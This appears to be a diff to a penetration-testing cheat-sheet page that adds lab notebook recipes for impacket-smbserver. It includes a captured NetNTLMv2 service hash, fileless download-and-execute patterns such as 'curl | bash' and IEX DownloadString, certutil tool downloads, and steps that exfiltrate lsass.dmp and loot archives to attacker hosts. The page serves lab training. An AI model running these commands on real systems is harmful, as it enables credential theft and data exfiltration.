@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=smbserver) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -22,8 +24,234 @@ sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password '
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=smbserver.py)
+## Notebook recipes
 
-## Learning and original examples
+13 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="Capture MSSQL Service Hash">
+
+### Capture MSSQL Service Hash
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+grcic550@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+[*] Config file parsed                                                 
+[*] Config file parsed                                                 
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully                        
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+[*] Closing down connection (10.129.203.7,49728)                      
+[*] Remaining connections []
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully
+[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+[*] Closing down connection (10.129.203.7,49728)
+[*] Remaining connections []
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision Tree">
+
+### Quick Decision Tree
+
+**File Transfers for Linux and Windows**
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+</Accordion>
+
+<Accordion title="SMB Downloads">
+
+### SMB Downloads
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+**File Transfers for Linux and Windows**
+
+```zsh
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/rdp-share
+```
+
+**File Transfers for Linux and Windows**
+
+```bash
+impacket-smbserver CompData /tmp/loot -smb2support -username grcan -password grcan123
+```
+
+</Accordion>
+
+<Accordion title="11. Attacking SAM, SYSTEM &amp; SECURITY">
+
+### 11. Attacking SAM, SYSTEM & SECURITY
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+# attacker:
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/you/Documents/
+```
+
+</Accordion>
+
+<Accordion title="Downloading TO a Windows target">
+
+### Downloading TO a Windows target
+
+**Pivoting and File Transfer: Field Reference**
+
+```powershell
+# PowerShell
+Invoke-WebRequest http://172.16.119.13:8080/tool.exe -OutFile C:\Users\Public\tool.exe
+# certutil (lives on every Windows box, less suspicious filename-wise)
+certutil -urlcache -split -f http://172.16.119.13:8080/tool.exe C:\Users\Public\tool.exe
+# SMB (impacket smbserver on a reachable host):
+copy \\172.16.119.13\share\tool.exe C:\Users\Public\
+# RDP drive redirect — no server at all:
+#   xfreerdp3 ... /drive:kali,/home/kali/loot   then inside Windows:
+copy \\tsclient\kali\tool.exe C:\Users\Public\
+```
+
+</Accordion>
+
+<Accordion title="Pulling files FROM the target to Kali (the hard direction)">
+
+### Pulling files FROM the target to Kali (the hard direction)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# 1) evil-winrm has it built in (pulls over your existing session):
+*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
+*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse
+
+# 2) Stage through the DMZ (a host the internal box CAN reach):
+#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
+impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
+#    on the internal host:
+net use \\172.16.119.13\share /user:u p
+copy C:\Temp\loot.zip \\172.16.119.13\share\
+#    DMZ -> Kali:
+scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
+
+# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
+#    becomes reachable from inside, push to it normally.
+
+# 4) base64 paste (small files / when nothing else works):
+#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
+#    Kali:     echo '<paste>' | base64 -d > x
+```
+
+</Accordion>
+
+<Accordion title="11. File transfer over a pivot">
+
+### 11. File transfer over a pivot
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali → internal). Internal hosts  cannot  reach your external Kali IP — so  net use \\&lt;KALI>\share  from the DC fails with  System error 53 , and  proxychains impacket-smbserver  does NOT help (proxychains only proxies  outbound clients , not a  listening server ).
+
+```text
+proxychains impacket-smbserver
+```
+
+</Accordion>
+
+<Accordion title="Impacket: Script Quick Reference">
+
+### Impacket: Script Quick Reference
+
+**Impacket: Script Quick Reference**
+
+Context from the notebook: SMB client / local server smbclient.py ,  smbserver.py  /  impacket-smbclient ,  impacket-smbserver SMB  ·  Transfers
+
+```text
+smbserver.py
+```
+
+</Accordion>
+
+<Accordion title="Creating a Share with smbserver.py">
+
+### Creating a Share with smbserver.py
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+</Accordion>
+
+</AccordionGroup>
